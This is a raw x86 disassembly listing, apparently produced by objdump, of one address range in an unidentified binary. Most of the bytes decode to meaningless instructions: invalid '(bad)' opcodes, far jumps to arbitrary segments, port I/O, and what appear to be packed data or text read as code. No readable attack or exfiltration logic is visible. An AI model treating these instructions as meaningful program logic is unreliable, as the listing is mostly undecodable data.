  415a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a51:	nop
  415a52:	into   
  415a53:	lea    ecx,[ebp-0x726c3d0f]
  415a59:	lea    ecx,[ebp+0x4040404]
  415a5f:	add    al,0x4
  415a61:	add    al,0x4
  415a63:	add    al,0x56
  415a65:	inc    ebx
  415a66:	mov    ds:0x8b8b8b8b,al
  415a6b:	mov    ecx,DWORD PTR [ebx+0x8b8b8b]
  415a71:	add    cl,dh
  415a73:	xchg   ecx,eax
  415a74:	adc    edx,ecx
  415a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a77:	cmp    al,0x4f
  415a79:	out    dx,eax
  415a7a:	inc    esp
  415a7b:	or     DWORD PTR [edx-0x438d2914],0xffffffce
  415a82:	adc    ch,ch
  415a84:	lahf   
  415a85:	loope  0x415a32
  415a87:	sbb    eax,0xc98c
  415a8c:	xor    BYTE PTR [eax+eax*1+0x920800],bh
  415a93:	add    BYTE PTR [edx],cl
  415a95:	call   0x7d11:0x17b92204
  415a9c:	sahf   
  415a9d:	jne    0x415acd
  415a9f:	xchg   DWORD PTR [eax+0xb48fbda],ebx
  415aa5:	test   ah,dl
  415aa7:	stos   BYTE PTR es:[edi],al
  415aa8:	cmp    BYTE PTR [edi+0xb980],bh
  415aae:	pop    ebp
  415aaf:	sub    dh,BYTE PTR [edi]
  415ab1:	sti    
  415ab2:	add    BYTE PTR [eax],al
  415ab4:	add    BYTE PTR [ecx-0xf],dl
  415ab7:	jnp    0x415ae1
  415ab9:	mov    bh,0x9b
  415abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abc:	inc    edi
  415abd:	outs   dx,DWORD PTR ds:[esi]
  415abe:	jo     0x415b04
  415ac0:	mov    DWORD PTR [eax-0x3e5e8d9f],edx
  415ac6:	push   esp
  415ac7:	pushf  
  415ac8:	xchg   esi,eax
  415ac9:	sbb    al,0x7d
  415acb:	push   ebp
  415acc:	retf   
  415acd:	and    dh,dl
  415acf:	cmp    ch,cl
  415ad1:	loopne 0x415b14
  415ad3:	test   eax,0x9954a76e
  415ad8:	add    BYTE PTR [eax],al
  415ada:	loope  0x415b50
  415adc:	add    BYTE PTR [eax],al
  415ade:	add    bh,bh
  415ae0:	(bad)  
  415ae1:	(bad)  
  415ae2:	(bad)  
  415ae3:	(bad)  
  415ae4:	(bad)  
  415ae5:	(bad)  
  415ae6:	(bad)  
  415ae7:	inc    DWORD PTR [ebp+0x8f77]
  415aed:	add    BYTE PTR [eax],al
  415aef:	add    BYTE PTR [eax],al
  415af1:	add    BYTE PTR [eax],al
  415af3:	add    BYTE PTR [ecx-0x4d79d977],cl
  415af9:	out    0x36,al
  415afb:	sub    DWORD PTR [edi],0x12
  415afe:	and    ch,BYTE PTR ds:0x62e68f20
  415b04:	lds    esi,FWORD PTR [edi+0x47]
  415b07:	les    edi,FWORD PTR [esi+0x3367a541]
  415b0d:	push   esp
  415b0e:	mov    DWORD PTR [ecx+0x799c18ab],ecx
  415b14:	sbb    DWORD PTR [ecx+0x35],esp
  415b17:	mov    DWORD PTR [edi+edi*8+0x103cf7b6],ebp
  415b1e:	adc    eax,DWORD PTR [eax+0x2edd6748]
  415b24:	mov    al,0x88
  415b26:	loop   0x415ba3
  415b28:	add    BYTE PTR [edx-0x765cd6e9],0x89
  415b2f:	repnz out 0x1c,eax
  415b32:	mov    DWORD PTR [ecx-0x76684719],ecx
  415b38:	add    bl,bh
  415b3a:	push   ecx
  415b3b:	fidivr WORD PTR [ebx]
  415b3d:	adc    al,0xb1
  415b3f:	rol    DWORD PTR [ecx],cl
  415b41:	sbb    ah,BYTE PTR [esi+ecx*8-0x382186cc]
  415b48:	popa   
  415b49:	mov    ds:0x134d4467,eax
  415b4e:	out    dx,al
  415b4f:	and    DWORD PTR [edi],esp
  415b51:	add    BYTE PTR [eax],al
  415b53:	add    bh,dl
  415b55:	push   ds
  415b56:	add    BYTE PTR [eax],al
  415b58:	xor    eax,0xdf
  415b5d:	je     0x415bd3
  415b5f:	je     0x415bd5
  415b61:	je     0x415bd7
  415b63:	je     0x415bd9
  415b65:	je     0x415b82
  415b67:	inc    ecx
  415b68:	push   ss
  415b69:	mov    DWORD PTR [edi-0x9bfc72f],ecx
  415b6f:	mov    ch,0x87
  415b71:	mov    edi,esi
  415b73:	push   ecx
  415b74:	jmp    0x6ade:0xe97c9be
  415b7b:	mov    bl,0x2f
  415b7d:	cli    
	...
  415b86:	add    BYTE PTR [ebp+0x75],dh
  415b89:	or     al,0xda
  415b8b:	call   0x7752:0xdb757537
  415b92:	aad    0x5a
  415b94:	mov    esp,0x2c080f3a
  415b99:	mov    esi,0x43f0f2f
  415b9e:	mov    ebp,ss
  415ba0:	rcr    DWORD PTR [ebp+edx*2+0x73e704de],0xc2
  415ba8:	push   edx
  415ba9:	(bad)  
  415baa:	mov    dh,0xdc
  415bac:	push   cs
  415bad:	mov    cl,0xe7
  415baf:	xor    DWORD PTR [eax-0xb8a8a0f],ebx
  415bb5:	push   esp
  415bb6:	jne    0x415c2d
  415bb8:	dec    eax
  415bb9:	lahf   
  415bba:	pusha  
  415bbb:	jne    0x415b48
  415bbd:	pop    ss
  415bbe:	fst    QWORD PTR [esi-0x6]
  415bc1:	aad    0x72
  415bc3:	jb     0x415c2d
  415bc5:	gs je  0x415c04
  415bc8:	jae    0x415c06
  415bca:	arpl   WORD PTR gs:[edx+0x61],sp
  415bce:	jb     0x415c0c
  415bd0:	and    BYTE PTR [ebp+edi*1+0x66],dh
  415bd4:	jo     0x415c2d
  415bd6:	cmp    dh,BYTE PTR [edx+0x69]
  415bd9:	push   0x6c6c2e22
  415bde:	jae    0x415c59
  415be0:	imul   esp,DWORD PTR [ebp+0xd],0x63532063
  415be7:	jae    0x415c59
  415be9:	jb     0x415c2c
  415beb:	arpl   WORD PTR ds:0x6e69696f,cx
  415bf1:	gs je  0x415c36
  415bf4:	jae    0x415c5b
  415bf6:	jns    0x415c6a
  415bf8:	sub    BYTE PTR [esi+0x6e],ch
  415bfb:	outs   dx,BYTE PTR ds:[esi]
  415bfc:	and    BYTE PTR gs:[ebp+0x69],ah
  415c00:	jo     0x415c4f
  415c02:	jae    0x415c69
  415c04:	jae    0x415c35
  415c06:	jbe    0x415c7b
  415c08:	jae    0x415c76
  415c0a:	imul   edx,DWORD PTR [edi+0x53],0x6f456320
  415c11:	push   0x794b7353
  415c16:	outs   dx,DWORD PTR ds:[esi]
  415c17:	and    ch,BYTE PTR [eax]
  415c19:	gs cs ins DWORD PTR es:[di],dx
  415c1d:	sub    DWORD PTR [edx],ecx
  415c1f:	cs gs inc edx
  415c22:	cs je  0x415c89
  415c25:	imul   eax
  415c27:	lahf   
  415c28:	into   
  415c29:	or     eax,0xcfaebbda
  415c2e:	pushf  
  415c2f:	test   DWORD PTR [edi+edi*4],ecx
  415c32:	mov    eax,ds:0xf0ccf1c0
  415c37:	mov    ecx,DWORD PTR [ebx+0x29dd2d8b]
  415c3d:	xchg   edx,eax
  415c3e:	jo     0x415c04
  415c40:	imul   DWORD PTR [edi+0x46]
  415c43:	scas   al,BYTE PTR es:[edi]
  415c44:	xor    BYTE PTR [edi+0x20],ch
  415c47:	push   0xfd8c1f5e
  415c4c:	scas   eax,DWORD PTR es:[edi]
  415c4d:	mov    ebx,0xb420042
  415c52:	std    
  415c53:	jmp    0x508b:0x8b154c61
  415c5a:	dec    ebx
  415c5b:	scas   al,BYTE PTR es:[edi]
  415c5c:	mov    ecx,DWORD PTR [ebx+0x8b]
  415c62:	add    BYTE PTR [eax],al
  415c64:	add    BYTE PTR [eax],al
  415c66:	add    BYTE PTR [eax],al
  415c68:	inc    ebp
  415c69:	sub    eax,DWORD PTR [ecx+0x0]
  415c6f:	add    BYTE PTR [eax],al
  415c71:	add    BYTE PTR [eax],al
  415c73:	add    BYTE PTR [eax],al
  415c75:	add    bh,bh
  415c77:	out    0x8b,eax
  415c79:	mov    bh,0xac
  415c7b:	fs aaa 
  415c7d:	push   esp
  415c7e:	or     DWORD PTR [edi],ebp
  415c80:	adc    ebp,DWORD PTR [eax+0x2]
  415c83:	and    bh,ah
  415c85:	iret   
  415c86:	std    
  415c87:	inc    ebp
  415c88:	or     eax,0x242e6aff
  415c8d:	in     eax,dx
  415c8e:	add    BYTE PTR [eax],al
  415c90:	jae    0x415c98
  415c92:	add    BYTE PTR [eax],al
  415c94:	popa   
  415c95:	sub    al,BYTE PTR [eax]
  415c97:	add    BYTE PTR ds:0x6ae30bad,al
  415c9d:	fwait
  415c9e:	pmaxsw mm5,QWORD PTR [ebx-0x25e09000]
  415ca5:	push   0xe9963954
  415caa:	sbb    dl,BYTE PTR [esp+ebx*4]
  415cad:	call   0x45422430
  415cb2:	jne    0x415c49
  415cb4:	je     0x415c56
  415cb6:	inc    ebp
  415cb7:	inc    ebp
  415cb8:	inc    ebp
  415cb9:	mov    ah,0x11
  415cbb:	test   al,0x6d
  415cbd:	mov    BYTE PTR [ebp+0x553096aa],bl
  415cc3:	fcmovnb st,st(0)
  415cc5:	les    edi,FWORD PTR [edi-0x5a]
  415cc8:	ja     0x415d0f
  415cca:	push   ss
  415ccb:	adc    eax,0xb418f3a4
  415cd0:	fmul   DWORD PTR [eax]
  415cd2:	ficom  WORD PTR [eax+ebp*4]
  415cd5:	pop    edx
  415cd6:	xchg   al,bh
  415cd8:	shl    DWORD PTR [ebx-0x68],1
  415cdb:	mov    ds:0x6e434545,eax
  415ce0:	inc    ebp
  415ce1:	inc    ebp
  415ce2:	inc    ebp
  415ce3:	call   0xe92a45d0
  415ce8:	call   0x312a45d5
  415ced:	xor    ecx,DWORD PTR [esi+0x0]
	...
  415cf8:	inc    ebp
  415cf9:	inc    ebp
  415cfa:	inc    ebx
  415cfb:	xchg   ecx,eax
  415cfc:	jne    0x415cec
  415cfe:	call   0x305d:0xed29077f
  415d05:	dec    esp
  415d06:	loop   0x415d2b
  415d08:	(bad)  
  415d09:	cmp    edx,ebp
  415d0b:	loope  0x415d15
  415d0d:	sar    BYTE PTR [esi+0x453d7889],1
  415d13:	inc    ebp
  415d14:	loop   0x415d69
  415d16:	sbb    eax,0x8dd3698d
  415d1b:	outs   dx,BYTE PTR ds:[esi]
  415d1c:	rcr    BYTE PTR [ebp+0x72b89c1c],cl
  415d22:	in     al,0xc8
  415d24:	push   0x61
  415d26:	xor    DWORD PTR [edx+ecx*1-0x564b1605],ebp
  415d2d:	dec    ebp
  415d2e:	xchg   edi,eax
  415d2f:	inc    ebx
  415d30:	ja     0x415d77
  415d32:	inc    ebp
  415d33:	push   ss
  415d34:	ja     0x415d4e
  415d36:	inc    ebp
  415d37:	inc    ebp
  415d38:	push   ebp
  415d39:	rcr    cl,1
  415d3b:	inc    ebp
  415d3c:	add    bh,bh
  415d3e:	sub    esi,DWORD PTR [esp+eax*4-0x61d5c29d]
  415d45:	xchg   edi,eax
  415d46:	inc    edx
  415d47:	jnp    0x415d3d
  415d49:	push   0x64
  415d4b:	and    al,0xbd
  415d4d:	ins    DWORD PTR es:[edi],dx
  415d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d4f:	mov    ecx,0x866b3c2a
  415d54:	mov    DWORD PTR [eax],0xae6a0000
  415d5a:	add    BYTE PTR [eax],al
  415d5c:	and    BYTE PTR [ebx+0x0],al
	...
  415d6a:	adc    al,0x93
  415d6c:	inc    ebx
  415d6d:	ja     0x415d9f
  415d6f:	rol    DWORD PTR [ebx+0x38],cl
  415d72:	mov    esi,0x84465ae5
  415d77:	pop    esi
  415d78:	lods   eax,DWORD PTR ds:[esi]
  415d79:	pop    esi
  415d7a:	or     eax,0x3342c21c
  415d7f:	mov    cl,ch
  415d81:	sub    al,BYTE PTR [eax]
	...
  415d8b:	(bad)  
  415d8c:	jmp    FWORD PTR [esi+0x16]
  415d8f:	es ds (bad) 
  415d92:	dec    DWORD PTR [ebp-0x3d]
  415d95:	scas   al,BYTE PTR es:[edi]
  415d96:	imul   BYTE PTR [edx-0x764b4eea]
  415d9c:	test   eax,0xb3a030ea
  415da1:	mov    eax,0x82bf32e1
  415da6:	and    eax,0xc3c9847f
  415dab:	mov    eax,ds:0xf947f3b6
  415db0:	dec    ebx
  415db1:	jne    0x415dd3
  415db3:	jae    0x415d51
  415db5:	push   eax
  415db6:	(bad)  
  415db7:	call   FWORD PTR [edi-0x2000031]
  415dbd:	add    edi,ebx
  415dbf:	(bad)  
  415dc0:	(bad)  
  415dc1:	ficomp WORD PTR [edi+eax*8+0x2e3f3d39]
  415dc8:	fcomp  QWORD PTR [edi+edx*4-0x34]
  415dcc:	sbb    BYTE PTR [ebx],dh
  415dce:	sbb    esp,DWORD PTR [ecx+0x47643504]
  415dd4:	lea    ebp,[edx]
  415dd6:	push   ebp
  415dd7:	aad    0x12
  415dd9:	(bad)  
  415dda:	(bad)  
  415ddb:	dec    DWORD PTR [edx+0x6a7fb644]
  415de1:	enter  0xcde5,0x1
  415de5:	and    eax,0x58ef1b9a
  415dea:	jo     0x415e1c
  415dec:	dec    ebp
  415ded:	clc    
  415dee:	mov    dh,0xd3
  415df0:	dec    edi
  415df1:	out    dx,eax
  415df2:	retf   
  415df3:	sar    bl,1
  415df5:	and    bh,BYTE PTR [eax+0xe]
  415df8:	and    bh,bh
  415dfa:	jmp    DWORD PTR [esi]
  415dfc:	std    
  415dfd:	mov    cl,0xff
  415dff:	(bad)  
  415e00:	(bad)  
  415e01:	(bad)  
  415e02:	(bad)  
  415e03:	(bad)  
  415e04:	(bad)  
  415e05:	(bad)  
  415e06:	(bad)  
  415e07:	(bad)  
  415e08:	(bad)  
  415e09:	(bad)  
  415e0a:	(bad)  
  415e0c:	sahf   
  415e0d:	jne    0x415e84
  415e0f:	jne    0x415e86
  415e11:	jne    0x415e88
  415e13:	jne    0x415e8a
  415e15:	jne    0x415da0
  415e17:	mov    ebp,ecx
  415e19:	mov    edi,0x590faa45
  415e1e:	push   ss
  415e1f:	jge    0x415dad
  415e21:	mov    edx,0x93b9fc07
  415e26:	lahf   
  415e27:	popa   
  415e28:	iret   
  415e29:	inc    eax
  415e2a:	sbb    ch,BYTE PTR [ebx+0x45f86a06]
  415e30:	mov    DWORD PTR [ecx-0x7676a11c],ecx
  415e36:	and    edx,DWORD PTR [edi+0x74ba8989]
  415e3c:	shl    DWORD PTR [esi],0x3
  415e3f:	sub    eax,0xbd3d53f5
  415e44:	jecxz  0x415e0d
  415e46:	sub    al,BYTE PTR [esi-0x737ac648]
  415e4c:	add    DWORD PTR [edx-0x72],edi
  415e4f:	dec    eax
  415e50:	dec    esp
  415e51:	mov    eax,0x4af1e889
  415e56:	or     al,0xc8
  415e58:	call   0xf4a14745
  415e5d:	cli    
  415e5e:	pop    edi
  415e5f:	dec    edi
  415e60:	jle    0x415e35
  415e62:	inc    ebx
  415e63:	pusha  
  415e64:	mov    edx,0x4f98618d
  415e69:	inc    esi
  415e6a:	xchg   esi,eax
  415e6b:	repz mov ah,0x2e
  415e6e:	mov    eax,ds:0xc27c89ae
  415e73:	mov    eax,ds:0x64d62e17
  415e78:	xchg   ebx,eax
  415e79:	xor    eax,0x4c47f0e0
  415e7e:	call   0xe8d1816b
  415e83:	call   0x8dceec70
  415e88:	lea    ecx,[ebp-0x72727273]
  415e8e:	add    dl,0xcb
  415e91:	(bad)  
  415e92:	(bad)  
  415e93:	(bad)  
  415e94:	(bad)  
  415e95:	(bad)  
  415e96:	(bad)  
  415e97:	(bad)  
  415e98:	(bad)  
  415e99:	inc    DWORD PTR [eax]
  415e9b:	add    dl,dl
  415e9d:	inc    esi
  415e9e:	fstp   DWORD PTR [eax-0x1ab4766a]
  415ea4:	adc    esp,DWORD PTR [ebx+0x27a91dce]
  415eaa:	push   ebx
  415eab:	adc    cl,bh
  415ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eae:	add    eax,0xdcf0e0a6
  415eb3:	add    BYTE PTR [eax],al
  415eb5:	add    BYTE PTR [ebp+edx*1+0x5af296b6],bh
  415ebc:	push   ds
  415ebd:	js     0x415ef2
  415ebf:	xchg   ecx,eax
  415ec0:	or     DWORD PTR [ebx+0xd],eax
  415ec3:	punpckhbw mm5,QWORD PTR [edx-0x73]
  415ec7:	ins    DWORD PTR es:[edi],dx
  415ec8:	call   0x3189583f
  415ecd:	mov    ecx,DWORD PTR [ecx-0x20]
  415ed0:	dec    ebp
  415ed1:	lahf   
  415ed2:	loopne 0x415ed4
  415ed4:	add    dh,al
  415ed6:	cmp    al,0xc9
  415ed8:	add    BYTE PTR [eax],al
  415eda:	out    dx,al
  415edb:	mov    eax,0x24000048
  415ee0:	mov    eax,0x78c5674d
  415ee5:	add    cl,bh
  415ee7:	ins    DWORD PTR es:[edi],dx
  415ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee9:	out    0x7d,al
  415eeb:	outs   dx,BYTE PTR ds:[esi]
  415eec:	ins    BYTE PTR es:[edi],dx
  415eed:	les    edi,FWORD PTR [esi+0x1]
  415ef0:	ins    BYTE PTR es:[edi],dx
  415ef1:	retf   0xa0ea
  415ef4:	jne    0x415e8a
  415ef6:	stc    
  415ef7:	add    BYTE PTR [eax],al
  415ef9:	add    BYTE PTR [esi+0x520000db],al
  415eff:	fild   DWORD PTR [eax]
  415f01:	and    ch,BYTE PTR [ebp+0x73]
  415f04:	jb     0x415f28
  415f06:	imul   esi,DWORD PTR [ebp+0x65],0x6570736d
  415f0d:	jae    0x415f82
  415f0f:	popa   
  415f10:	cs jb  0x415f78
  415f13:	imul   sp,WORD PTR [eax],0x6d65
  415f18:	and    BYTE PTR [ecx+0x20],al
  415f1b:	dec    edi
  415f1c:	and    ah,BYTE PTR [ebp+0x3c]
  415f1f:	arpl   WORD PTR [ebx+0x76],sp
  415f22:	gs ja  0x415f2f
  415f25:	outs   dx,DWORD PTR ds:[esi]
  415f26:	and    BYTE PTR [ebp+0x65],ah
  415f29:	arpl   WORD PTR cs:[ebp+0xa],sp
  415f2d:	and    ah,BYTE PTR [ebx+0x2e]
  415f30:	popa   
  415f31:	gs jae 0x415f62
  415f34:	ins    BYTE PTR es:[edi],dx
  415f35:	je     0x415fa0
  415f37:	cmp    al,0x74
  415f39:	imul   esp,DWORD PTR [eax],0x3e703d20
  415f3f:	je     0x415fa6
  415f41:	fs jne 0x415f66
  415f44:	cmp    eax,0x6d203d63
  415f49:	add    BYTE PTR [eax],al
  415f4b:	(bad)  
  415f4c:	(bad)  
  415f4d:	(bad)  
  415f4e:	(bad)  
  415f4f:	(bad)  
  415f50:	(bad)  
  415f51:	(bad)  
  415f52:	(bad)  
  415f53:	call   FWORD PTR [ebp+0x3]
  415f56:	scas   eax,DWORD PTR es:[edi]
  415f57:	dec    ecx
  415f58:	stc    
  415f59:	add    al,0xe9
  415f5b:	call   0xb60ab84f
  415f60:	jmp    0xd8a9:0x102d5030
  415f67:	mov    sp,ax
  415f6a:	or     BYTE PTR [edx+0x0],dl
  415f70:	add    BYTE PTR [eax],al
  415f72:	add    BYTE PTR [eax],al
  415f74:	add    al,ch
  415f76:	call   0x4d4d448
  415f7b:	call   0x3e5bcf68
  415f80:	(bad)
  415f83:	and    al,0x6a
  415f85:	push   cs
  415f86:	jne    0x415feb
  415f88:	sti    
  415f89:	and    BYTE PTR [edi],0x49
  415f8c:	retf   
  415f8d:	jbe    0x415f85
  415f8f:	jnp    0x415fb6
  415f91:	test   al,0x94
  415f93:	jmp    0x22f6:0xfb7d4646
  415f9a:	add    eax,0x881f5bd1
  415f9f:	ds call 0xe8cf7d8d
  415fa5:	call   0xe907431e
  415faa:	add    BYTE PTR [edi-0x74],cl
  415fad:	out    0xff,eax
  415faf:	or     DWORD PTR [edi+0x53e697cd],esi
  415fb5:	xchg   esi,eax
  415fb6:	push   es
  415fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fb8:	add    DWORD PTR [eax-0x45],ecx
  415fbb:	dec    si
  415fbd:	or     eax,0x9a58ad22
  415fc2:	sbb    eax,DWORD PTR [eax]
  415fc4:	add    BYTE PTR [eax],al
  415fc6:	jmp    0xa245d962
  415fcb:	ret    
  415fcc:	mov    gs,WORD PTR [eax+0x3b]
  415fcf:	adc    ebx,DWORD PTR [esi+0x61]
  415fd2:	(bad)  
  415fd4:	bnd jae 0x415f71
  415fd7:	xchg   ebp,eax
  415fd8:	mov    BYTE PTR [ecx+0x75],ch
  415fdb:	js     0x39777d1a
  415fe1:	jle    0x415ff3
  415fe3:	add    BYTE PTR [eax],al
  415fe5:	pop    esi
  415fe6:	push   es
  415fe7:	fadd   DWORD PTR [eax]
  415fe9:	add    BYTE PTR [eax],al
  415feb:	(bad)  
  415fec:	(bad)  
  415fed:	(bad)  
  415fee:	(bad)  
  415fef:	(bad)  
  415ff0:	(bad)  
  415ff1:	(bad)  
  415ff2:	(bad)  
  415ff3:	inc    DWORD PTR [esp+edi*4+0x9f]
  415ffa:	add    BYTE PTR [eax],al
  415ffc:	add    BYTE PTR [eax],al
  415ffe:	add    BYTE PTR [eax],al
  416000:	call   0x58c32ced
  416005:	call   0x845f:0xfb9b122b
  41600c:	in     al,0x9e
  41600e:	icebp  
  41600f:	sub    BYTE PTR [ecx],dh
  416011:	push   eax
  416012:	(bad)  
  416013:	pop    edi
  416014:	xchg   esi,eax
  416015:	pop    es
  416016:	popf   
  416017:	test   eax,0xe8e814a8
  41601c:	jbe    0x416001
  41601e:	call   0xe8fd2f0b
  416023:	call   0x60885ccc
  416028:	aad    0xe8
  41602a:	and    eax,0x190da6ae
  41602f:	mov    ds:0x409975c5,al
  416034:	sbb    al,0x1a
  416036:	add    esi,esi
  416038:	cwde   
  416039:	sbb    BYTE PTR [edx-0x6a761741],0xb0
  416040:	mov    eax,DWORD PTR [esi-0x77]
  416043:	mov    DWORD PTR [ecx+0x22ee6445],ecx
  416049:	dec    ebx
  41604a:	pop    ds
  41604b:	add    BYTE PTR [eax-0x26],cl
  41604e:	jmp    0x4160c4
  416050:	sub    eax,0x9667b3b6
  416055:	jle    0x416097
  416057:	cmp    eax,0x49f20532
  41605c:	sbb    eax,0x77d620a
  416061:	sub    eax,0xa9c333c4
  416066:	jnp    0x416050
  416068:	mov    DWORD PTR [ecx-0x76766f77],ecx
  41606e:	mov    DWORD PTR [eax],eax
	...
  416078:	test   DWORD PTR [edi],esi
  41607a:	pop    esi
  41607b:	jne    0x4160f2
  41607d:	jne    0x4160f4
  41607f:	jne    0x4160f6
  416081:	jne    0x4160f8
  416083:	jne    0x416051
  416085:	int3   
  416086:	mov    ecx,0x63789822
  41608b:	pop    ebp
  41608c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41608d:	(bad)  
  41608e:	out    dx,eax
  41608f:	push   ds
  416090:	inc    ebp
  416091:	xchg   esi,eax
  416092:	dec    ebx
  416093:	or     eax,0x699aec74
  416098:	stc    
  416099:	ins    DWORD PTR es:[edi],dx
  41609a:	in     eax,0x46
  41609c:	jnp    0x4160c8
  41609e:	int3   
  41609f:	int3   
  4160a0:	inc    ebx
  4160a1:	cmp    DWORD PTR [eax+0x601d3488],edi
  4160a7:	mov    cl,0x80
  4160a9:	in     eax,dx
  4160aa:	mov    ch,0xf2
  4160ac:	mov    cs,WORD PTR [edx-0x3d5c7666]
  4160b2:	mov    edi,0xad94fea3
  4160b7:	lea    edx,[ebx-0x616d774f]
  4160bd:	int3   
  4160be:	int3   
  4160bf:	push   es
  4160c0:	loop   0x416051
  4160c2:	int3   
  4160c3:	int3   
  4160c4:	nop
  4160c5:	add    al,0xe2
  4160c7:	int3   
  4160c8:	add    BYTE PTR [ecx-0x7f],cl
  4160cb:	and    ebp,esp
  4160cd:	cmp    al,cl
  4160cf:	les    edi,FWORD PTR [edx]
  4160d1:	inc    esi
  4160d2:	mov    edi,0xa3908938
  4160d7:	pop    ebp
  4160d8:	push   esp
  4160d9:	push   ebx
  4160da:	pop    ecx
  4160db:	pusha  
  4160dc:	add    ah,BYTE PTR [ebx+ebp*2]
  4160df:	ja     0x416109
  4160e1:	add    BYTE PTR [eax],al
  4160e3:	add    ch,ch
  4160e5:	dec    ecx
  4160e6:	add    BYTE PTR [eax],al
  4160e8:	out    0x17,al
  4160ea:	add    BYTE PTR [eax],al
  4160ec:	add    BYTE PTR [esp],ah
  4160ef:	and    al,0x24
  4160f1:	and    al,0x24
  4160f3:	and    al,0x24
  4160f5:	and    al,0x49
  4160f7:	pop    esp
  4160f8:	stos   BYTE PTR es:[edi],al
  4160f9:	ficomp WORD PTR [ecx+edi*2+0x51]
  4160fd:	push   ds
  4160fe:	mov    dl,0xd8
  416100:	sbb    ebx,esp
  416102:	cwde   
  416103:	cmp    bl,BYTE PTR [edx+ebx*4+0x4caa1cb]
  41610a:	push   esp
  41610b:	cmp    ch,dh
  41610d:	stos   DWORD PTR es:[edi],eax
  41610e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  416114:	mov    ecx,DWORD PTR [ebx-0x68171775]
  41611a:	dec    ebp
  41611b:	dec    edx
  41611c:	jo     0x416106
  41611e:	call   0x3387cdda
  416123:	mov    ah,0xea
  416125:	sbb    eax,0x494a820d
  41612a:	add    DWORD PTR [ebp+0xfb7466e],edi
  416130:	sub    DWORD PTR [ecx],eax
  416132:	sbb    eax,ebp
  416134:	mov    ch,0xcf
  416136:	add    eax,0xedea57a6
  41613b:	xchg   esi,eax
  41613c:	cmp    ebx,DWORD PTR [eax+edx*4+0x36]
  416140:	xor    esp,ebp
  416142:	call   0xe8b1c02f
  416147:	call   0xe87e27d5
  41614c:	add    BYTE PTR [esi],bh
  41614e:	sub    eax,0x72a5b975
  416153:	jae    0x4161b6
  416155:	and    BYTE PTR [eax],ah
  416157:	popa   
  416158:	gs outs dx,BYTE PTR gs:[esi]
  41615b:	outs   dx,BYTE PTR ds:[esi]
  41615c:	inc    ecx
  41615d:	and    BYTE PTR cs:[eax],ah
  416160:	inc    ebx
  416161:	inc    ecx
  416162:	imul   esp,DWORD PTR [ebp+0x2e],0x222e0a2e
  416169:	and    BYTE PTR cs:[edx+0x73],ah
  41616d:	arpl   WORD PTR ds:[eax],sp
  416170:	bound  esp,QWORD PTR [bp+si+0x73]
  416174:	imul   esi,DWORD PTR [esi+esi*2+0x65],0x20206e6f
  41617c:	jb     0x4161f2
  41617e:	ins    DWORD PTR es:[edi],dx
  41617f:	inc    esp
  416180:	inc    esp
  416181:	and    BYTE PTR [esi+0xa],dh
  416184:	cs jae 0x4161fa
  416187:	and    BYTE PTR [esi],ch
  416189:	gs bound ebp,QWORD PTR gs:[ecx+0x20]
  41618e:	push   ebx
  41618f:	lods   eax,DWORD PTR ds:[esi]
  416190:	fadd   st,st(4)
  416192:	cmp    ecx,DWORD PTR [ebx+0x60]
  416195:	cmp    BYTE PTR [esi-0x1],bl
  416198:	ss leave 
  41619a:	jl     0x416187
  41619c:	push   0xffffff89
  41619e:	addr16 jne 0x416204
  4161a1:	aam    0x0
  4161a3:	add    BYTE PTR [eax],al
  4161a5:	stos   DWORD PTR es:[edi],eax
  4161a6:	aas    
  4161a7:	lods   al,BYTE PTR ds:[esi]
  4161a8:	inc    eax
  4161a9:	mov    bh,0x88
  4161ab:	out    0xb1,al
  4161ad:	xor    al,0xa0
  4161af:	push   esi
  4161b0:	xchg   esp,eax
  4161b1:	fwait
  4161b2:	inc    ebx
  4161b3:	cmp    BYTE PTR [ecx-0xa],dl
  4161b6:	push   ecx
  4161b7:	ficomp DWORD PTR [eax-0x5338ce61]
  4161bd:	push   edx
  4161be:	xchg   edi,eax
  4161bf:	cmp    al,0x61
  4161c1:	sbb    eax,DWORD PTR [eax]
  4161c3:	add    cl,bl
  4161c5:	mov    esp,0x1c
	...
  4161d2:	add    bh,ch
  4161d4:	push   edx
  4161d5:	loopne 0x4161d7
	...
  4161df:	add    BYTE PTR [eax],al
  4161e1:	retf   0x7f8
  4161e4:	jle    0x4161d4
  4161e6:	sub    BYTE PTR [ebx-0x409a5c0f],ah
  4161ec:	xchg   edi,eax
  4161ed:	mov    al,0xa1
  4161ef:	mov    esp,0x5af3f3db
  4161f4:	xchg   DWORD PTR [edi+0xec0b22],eax
  4161fa:	add    BYTE PTR [eax],al
  4161fc:	or     al,BYTE PTR [eax]
  4161fe:	add    ah,al
  416200:	xchg   edx,eax
  416201:	add    BYTE PTR [eax],al
  416203:	dec    esi
  416204:	mov    ecx,0x7c715e1d
  416209:	jle    0x41625f
  41620b:	aam    0x9d
  41620d:	gs jnp 0x416243
  416210:	std    
  416211:	out    dx,eax
  416212:	xor    dl,BYTE PTR [esi]
  416214:	mov    bh,0x65
  416216:	lods   al,BYTE PTR ds:[esi]
  416217:	add    al,ah
  416219:	mov    dh,0x66
  41621b:	add    BYTE PTR [eax],al
  41621d:	add    eax,0x6fc8c6
  416222:	add    BYTE PTR [eax],al
  416224:	imul   esp,DWORD PTR [ecx-0x46293920],0xffffffa1
  41622b:	jb     0x416218
  41622d:	sub    ebp,edi
  41622f:	sbb    bh,ah
  416231:	xchg   ecx,eax
  416232:	jge    0x41626e
  416234:	mov    ebp,0xbebfe7be
  416239:	adc    eax,DWORD PTR [esi+ebx*4+0x4fb71d35]
  416240:	push   ecx
  416241:	sub    bl,bh
  416243:	inc    ebx
  416244:	jne    0x416296
  416246:	push   ebp
  416247:	add    BYTE PTR [eax],al
  416249:	push   eax
  41624a:	inc    esp
	...
  416257:	mov    eax,0xf814
	...
  416264:	add    BYTE PTR [esi+0x3f32b56e],al
  41626a:	adc    eax,0xd751c5e
  41626f:	cmp    al,0x43
  416271:	push   eax
  416272:	pop    ss
  416273:	dec    ebx
  416274:	sub    DWORD PTR [edx-0x16],esi
  416277:	in     al,0xd1
